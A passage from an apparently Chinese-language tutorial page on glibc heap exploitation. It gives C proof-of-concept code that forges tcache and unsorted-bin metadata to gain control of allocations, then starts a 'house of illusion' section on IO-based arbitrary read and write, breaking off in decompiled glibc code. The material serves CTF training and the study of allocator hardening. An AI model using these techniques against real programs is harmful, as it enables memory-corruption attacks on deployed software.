class="string">&quot;\t\t* end of fake\t\t@ %p\n&quot;</span>, end_of_fake);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Write the correct metadata to the chunk to prevent libc from failing checks:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p = 0x10000\n&quot;</span>, end_of_fake);</span><br><span class="line">	*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p = 0x20\n&quot;</span>, end_of_fake+<span class="number">8</span>);</span><br><span class="line">	*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Creating the following setup:&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	dump_memory(end_of_fake, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 4           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 4: Free t-cache entries</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Fill up the 0x90 t-cache with the chunks allocated from earlier by freeing them.&quot;</span>);	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;By doing so, the next time a 0x88 chunk is free&#x27;d, it ends up in the unsorted-bin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;instead of the t-cache or small-bins.&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 5           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Step 5: Create a 0x20 and a 0x30 t-cache entry which overlaps unsorted_start and unsorted_end.</span></span><br><span class="line">	<span class="comment">// By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!</span></span><br><span class="line">		</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Here comes the trickiest part!\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;We essentially want a pointer in the 0x20 t-cache metadata to act as a FWD\n&quot;</span></span><br><span class="line">	<span class="string">&quot;pointer and a pointer in the 0x30 t-cache to act as a BCK pointer.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;We want it such that it points to the chunk header of our unsorted bin entries,\n&quot;</span></span><br><span class="line">	<span class="string">&quot;and not at the chunk itself which is common for t-cache.\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Using a technique like house of botcake or a stronger arb-free primitive, free a&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;chunk such that it overlaps with the header of unsorted_start and unsorte_end.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;It should look like the following:&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;unsorted_start:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%016lx\t\t0x%016lx  0x%016lx  &lt;-- tcachebins[0x30][0/1], unsortedbin[all][0]\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)(unsorted_start<span class="number">-0x10</span>), *(<span class="type">long</span> *)(unsorted_start<span class="number">-0x10</span>), *(<span class="type">long</span> *)(unsorted_start<span class="number">-0x8</span>));</span><br><span class="line">	dump_memory(unsorted_start, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;unsorted_end:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%016lx\t\t0x%016lx  0x%016lx  &lt;-- tcachebins[0x20][0/1], unsortedbin[all][2]\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)(unsorted_end<span class="number">-0x10</span>), *(<span class="type">long</span> *)(unsorted_end<span class="number">-0x10</span>), *(<span class="type">long</span> *)(unsorted_end<span class="number">-0x8</span>));</span><br><span class="line">	dump_memory(unsorted_end, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;If you want to see a blind example using only double free, see the following chal: &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;For the sake of simplicity, let&#x27;s just simulate an arbitrary free primitive.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|      PART 1      |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 5 part 1:</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Write 0x31 above unsorted_start to enable its freeing into the 0x30 t-cache.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p-0x18 = 0x31\n&quot;</span>, unsorted_start);</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This creates a 0x31 entry just above unsorted_start, which looks like the following:&quot;</span>);</span><br><span class="line">	dump_memory(unsorted_start<span class="number">-0x20</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the faked 0x31 chunk @ %p\n&quot;</span>, unsorted_start<span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Finally, because of the meta-data created by free&#x27;ing the 0x31 chunk, we need to&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;restore the original header of the unsorted_start chunk by restoring the 0x91 header:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p-0x8 = 0x91\n&quot;</span>, unsorted_start);</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now, let&#x27;s do the same for unsorted_end except using a 0x21 faked chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;|      PART 2      |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 5 part 2:</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Write 0x21 above unsorted_end, such that it can be free&#x27;d in to the 0x20 t-cache:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p-0x18 = 0x21\n&quot;</span>, unsorted_end);</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This creates a 0x21 just above unsorted_end, which looks like the following:&quot;</span>);</span><br><span class="line">	dump_memory(unsorted_end<span class="number">-0x20</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the faked 0x21 chunk @ %p\n&quot;</span>, unsorted_end<span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;restore the original header of the unsorted_end chunk by restoring the 0x91 header:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t*%p-0x8 = 0x91\n&quot;</span>, unsorted_end);</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 6           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 6: Create the unsorted bin list</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now, let&#x27;s free the unsorted bin entries!&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t&gt; free(unsorted_end);&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_end);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t&gt; free(unsorted_middle);&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_middle);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t&gt; free(unsorted_start);&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_start);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show the setup as is	</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;At this point, our heap looks something like this:&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t- Unsorted bin:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t\tunsorted_start &lt;--&gt; unsorted_middle &lt;--&gt; unsorted_end&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t%p &lt;--&gt; %p &lt;--&gt; %p\n&quot;</span>, unsorted_start<span class="number">-0x10</span>, unsorted_middle<span class="number">-0x10</span>, unsorted_end<span class="number">-0x10</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t- 0x20 t-cache:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* 0x%lx\n&quot;</span>, *(<span class="type">long</span>*)(metadata+<span class="number">0x90</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t- 0x30 t-cache\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* 0x%lx\n&quot;</span>, *(<span class="type">long</span>*)(metadata+<span class="number">0x98</span>));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fake chunk in the t-cache will look like the following:&quot;</span>);</span><br><span class="line">	dump_memory(metadata+<span class="number">0x70</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;We can now observe that the 0x30 t-cache points to unsorted_start and 0x20 t-cache points to &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;unsorted_end, which is what we need to fake an unsorted-bin entry and hijack unsorted_middle.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 7           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 7: Overwrite LSB of unsorted_start and unsorted_end to point to the fake t-cache metadata chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Finally, all there is left to do is simply overwrite the LSB of unsorted_start FWD-&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;and BCK pointer for unsorted_end to point to the faked t-cache metadata chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t- unsorted_start:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t*%p = %p\n&quot;</span>, unsorted_start, metadata+<span class="number">0x80</span>); </span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t- unsorted_end:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t*%p = %p\n&quot;</span>, unsorted_end, metadata+<span class="number">0x80</span>); </span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;At this point, the unsorted bin will look like the following:&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t- unsorted bin:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t unsorted_start &lt;--&gt; metadata chunk &lt;--&gt; unsorted_end\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t %p\t     %p      %p\n&quot;</span>, unsorted_start, metadata+<span class="number">0x80</span>, unsorted_end);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 8           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 8: allocate to win</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now, simply just allocate a chunk that&#x27;s within the 0x10000 range&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;to allocate from the faked chunk. As an example, we will allocate a 0x288:&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t- 0x288 chunk:&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line">	<span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\tNew chunk\t @ %p\n&quot;</span>, meta_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\tt-cache metadata @ %p\n&quot;</span>, metadata);</span><br><span class="line">	assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           BONUS!           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// BONUS!	</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Whilst the primary goal of this house is to provide a leakless way&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;to gain t-cache control by overwriting LSB, a nice bonus is the free LIBC&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;pointer we get as an added bonus to the method!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is what the t-cache metadata will look like after we allocated the&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;t-cache metadata chunk:&quot;</span>);</span><br><span class="line">	dump_memory(metadata+<span class="number">0x70</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Notice how the 0x20 and 0x30 t-cache now contains a libc pointer to the main_arena.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-illusion"><a href="#house-of-illusion" class="headerlink" title="house of illusion"></a>house of illusion</h1><h2 id="概要-25"><a href="#概要-25" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>基于io的任意读写原语</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>已知glibc基地址</li>
<li>可控的已知地址（可写入内容构造fake file）</li>
<li>需要一次libc内任意地址写可控地址</li>
<li>程序能正常退出或者通过exit()退出</li>
</ol>
<p><strong>利用效果:</strong>任意地址读写</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-25"><a href="#原理-25" class="headerlink" title="原理"></a>原理</h2><h3 id="任意写-1"><a href="#任意写-1" class="headerlink" title="任意写"></a>任意写</h3><p>原先打<code>io</code>利用的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vtable-&gt;__overflow((FILE *)chain, -1)</span><br></pre></td></tr></table></figure>
<p>也就是调用了<code>_IO_new_file_overflow</code>，在这个函数中存在：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ch_0 == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> IO_new_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall _IO_new_do_write(FILE_0 *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !to_do )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( to_do == new_do_write(fp, data, to_do) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">new_do_write`可以调用`_vtables + <span class="number">0x78</span>`的函数，也就是`_IO_new_file_write</span><br><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">new_do_write</span><span class="params">(FILE_0 *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 cur_column; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> *IO_buf_base; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">__off64_t</span> v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (fp-&gt;_flags &amp; <span class="number">0x1000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_offset = <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( fp-&gt;_IO_read_end != fp-&gt;_IO_write_base )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_QWORD *)&amp;fp[<span class="number">1</span>]._flags;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v11 - (_QWORD)_io_vtables) &gt; <span class="number">0x92F</span> )</span><br><span class="line">      IO_vtable_check();</span><br><span class="line">    v12 = (*(__int64 (__fastcall **)(FILE_0 *, <span class="type">signed</span> __int64, __int64))(v11 + <span class="number">0x80</span>))(</span><br><span class="line">            fp,</span><br><span class="line">            fp-&gt;_IO_write_base - fp-&gt;_IO_read_end,</span><br><span class="line">            <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    fp-&gt;_offset = v12;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(_QWORD *)&amp;fp[<span class="number">1</span>]._flags;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v5 - (_QWORD)_io_vtables) &gt; <span class="number">0x92F</span> )</span><br><span class="line">    IO_vtable_check();</span><br><span class="line">  v6 = (*(__int64 (__fastcall **)(FILE_0 *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>))(v5 + <span class="number">0x78</span>))(fp, data, to_do);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  cur_column = fp-&gt;_cur_column;</span><br><span class="line">  <span class="keyword">if</span> ( cur_column &amp;&amp; v6 )</span><br><span class="line">    fp-&gt;_cur_column = _GI__IO_adjust_column(cur_column - <span class="number">1</span>, data, v6) + <span class="number">1</span>;</span><br><span class="line">  IO_buf_base = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_base = IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_ptr = IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_ptr = IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = IO_buf_base;</span><br><span class="line">  <span class="keyword">if</span> ( fp-&gt;_mode &gt; <span class="number">0</span> || (fp-&gt;_flags &amp; <span class="number">0x202</span>) == <span class="number">0</span> )</span><br><span class="line">    IO_buf_base = fp-&gt;_IO_buf_end;</span><br><span class="line">  fp-&gt;_IO_write_end = IO_buf_base;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line">_IO_new_file_write`就实现了真正的`write</span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">IO_new_file_write</span><span class="params">(FILE_0 *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">ssize_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">__off64_t</span> offset; <span class="comment">// 